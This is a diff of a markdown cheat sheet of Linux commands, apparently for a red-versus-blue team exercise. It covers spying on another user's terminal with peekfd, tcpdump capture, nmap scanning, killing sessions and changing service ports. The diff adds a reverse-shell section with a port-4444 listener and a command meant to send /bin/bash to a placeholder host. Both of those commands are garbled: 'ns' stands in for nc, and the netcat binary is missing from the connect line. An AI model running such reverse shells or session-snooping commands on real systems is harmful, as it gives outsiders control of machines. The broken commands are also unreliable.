@@ -18,11 +18,11 @@
    w
    ```
    2. observe session
-```bash
-session=pts/0 #session to watch
-ps -fat #find pts/0 Ss in the list and look at the PID column
-peekfd -8cnd $PID 0 1 2
-```
+   ```bash
+   session=pts/0 #session to watch
+   ps -fat #find pts/0 Ss in the list and look at the PID column
+   peekfd -8cnd $PID 0 1 2
+   ```
 
 3. ports
    1. what port is doing what
@@ -101,10 +101,15 @@ iptables -A OUTPUT -p tcp -m state --state NEW -j LOG --log-prefix "OUTGOING con
 ```
 
    1. content listening
-
-```bash
-tcpdump -ttttnnvvSX -c$NUMBER_OF_PACKETS_TO_READ src $SOURCE_IP_ADDRESS and dst port $DESTINATION_PORT
-```
+      1. for general listening of the network activity
+      ```bash
+      tcpdump -i any -nn -q
+      ```
+      2. to focus on specific network activity
+      ```bash
+      tcpdump -ttttnnvvSX -c$NUMBER_OF_PACKETS_TO_READ src $SOURCE_IP_ADDRESS and dst port $DESTINATION_PORT
+      ```
+   
 
 
 
@@ -115,7 +120,15 @@ tcpdump -ttttnnvvSX -c$NUMBER_OF_PACKETS_TO_READ src $SOURCE_IP_ADDRESS and dst 
    ```bash
    nmap $UKE_IP_ADRESS
    ```
-   2. 
+2. Reverse shell
+   1. wait for the reverse shell connection
+   ```bash
+   ns -lvnp 4444
+   ```
+   2. connect the reverse shell
+   ```bash
+   nohup TORI_IP 4444 -e /bin/bash
+   ```
 
 
 
@@ -128,5 +141,17 @@ tcpdump -ttttnnvvSX -c$NUMBER_OF_PACKETS_TO_READ src $SOURCE_IP_ADDRESS and dst 
    pkill -9 -t $TTY
    ```
 2. ports
+   1. change ssh port
+   ```bash
+   echo "Port 2222" | sudo tee -a /etc/ssh/sshd_config && sudo systemctl restart ssh
+   ```
+   2. change telnet port
+   ```bash
+   echo -e "telnet\t4444/tcp" | sudo tee -a /etc/services && sudo systemctl restart xinetd
+   ```
+   3. change ftp port
+   ```bash
+   echo "0.0.0.0,2121" | sudo tee /etc/pure-ftpd/conf/Bind >/dev/null && sudo systemctl restart pure-ftpd
+   ```
 3. processes
 4. communications
